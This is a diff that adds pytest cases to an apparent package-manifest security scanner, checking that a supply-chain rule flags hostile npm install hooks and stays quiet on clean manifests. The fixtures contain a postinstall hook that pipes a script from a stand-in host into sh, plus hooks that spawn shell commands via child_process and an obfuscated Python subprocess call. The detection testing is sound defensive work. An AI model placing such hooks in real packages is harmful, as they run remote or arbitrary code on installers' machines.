@@ -87,6 +87,30 @@ def test_long_hook_body_evidence_is_truncated():
     assert len(finding.evidence) == 200  # capped, never the whole blob
 
 
+# realistic install-hook payloads (each flags) paired with a realistic clean manifest (quiet),
+# inert: the network target is RFC-reserved (example.invalid) and nothing is ever installed.
+_REAL_HOOK_CASES = [
+    (
+        '{"name": "testpkg", "version": "1.0.0", "scripts": {"postinstall": "curl -fsSL http://example.invalid/setup.sh | sh"}}\n',
+        '{"name": "testpkg", "version": "1.0.0", "scripts": {"build": "tsc --noEmit", "lint": "eslint src/"}}\n',
+    ),
+    (
+        '{"name": "testpkg", "version": "1.0.0", "scripts": {"preinstall": "node -e \'require(\\"child_process\\").exec(\\"whoami\\")\'"}}\n',
+        '{"name": "testpkg", "version": "1.0.0", "scripts": {"prepare": "husky install", "test": "jest --coverage"}}\n',
+    ),
+    (
+        '{"name": "testpkg", "version": "1.0.0", "scripts": {"install": "python3 -c \\"import subprocess; subprocess.run([chr(105)+chr(100)])\\""}}\n',
+        '{"name": "testpkg", "version": "1.0.0", "scripts": {"start": "node dist/index.js", "clean": "rimraf dist"}}\n',
+    ),
+]
+
+
+@pytest.mark.parametrize("bad, good", _REAL_HOOK_CASES)
+def test_real_world_install_hooks(bad, good):
+    assert "MF-SUPPLY-INSTALL-HOOK" in rule_ids(run_manifest_audit(bad))
+    assert "MF-SUPPLY-INSTALL-HOOK" not in rule_ids(run_manifest_audit(good))
+
+
 def test_install_hook_is_npm_only():
     # the npm lifecycle-hook check must no-op on a non-npm manifest (here, a pyproject.toml)
     src = '[project]\nname = "x"\n[tool.poetry.scripts]\npostinstall = "x:main"\n'
